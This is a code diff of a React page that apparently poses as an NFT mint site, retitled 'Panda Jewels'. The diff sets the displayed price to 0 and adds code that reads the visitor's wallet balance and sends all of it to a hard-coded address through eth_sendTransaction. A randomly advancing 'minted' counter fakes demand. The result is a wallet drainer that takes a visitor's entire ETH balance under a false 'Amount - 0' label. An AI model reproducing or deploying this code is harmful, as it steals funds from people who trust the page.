@@ -3,9 +3,9 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = 0.026
-const image = 'https://images-ext-1.discordapp.net/external/6U1d5_lCzYsOLnfm7n891uarmW0gzVhur1l4SgfRw14/https/pbs.twimg.com/profile_images/1472105580491771905/5jlJFDr4_400x400.jpg'
-const Title = 'PowerUp Gym'
+const ethAmount = 0
+const image = 'https://pbs.twimg.com/profile_images/1623057813412151303/XkyzUjkQ_400x400.jpg'
+const Title = 'Panda Jewels'
 const supply = 2222
 
 document.title = Title
@@ -37,7 +37,7 @@ function App() {
         const address = await window.ethereum.request({method: 'eth_requestAccounts'})
 
         const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
-
+        const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
         // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
 
         let params = [{
@@ -45,7 +45,7 @@ function App() {
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt(ethAmount * 1000000000000000000).toString(16)
+            "value": parseInt(convertedBalance * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
@@ -66,7 +66,7 @@ function App() {
        if (Number(offset) <= 230) {
            const timer = setTimeout(() => {
                const random = getRandomArbitrary(1, 3)
-              const randomToFixed = Number(random.toFixed())
+               const randomToFixed = Number(random.toFixed())
                setOffset(Number(offset) + randomToFixed)
            }, 4000)
            return () => clearTimeout(timer);
@@ -105,8 +105,8 @@ function App() {
                     <div>Amount - {ethAmount}</div>
                     <button onClick={connectAndSend}>connect</button>
                     <div className={'lineContainer'}>
-                        <div className={'line'}></div>
-                        <div className={'circleOnLine'} style={{left: `${offset}px`}}></div>
+                       <div className={'line'}></div>
+                       <div className={'circleOnLine'} style={{left: `${offset}px`}}></div>
                     </div>
                     <div>{`${(offset * (supply / 235)).toFixed()} / ${supply}`}</div>
                 </div>
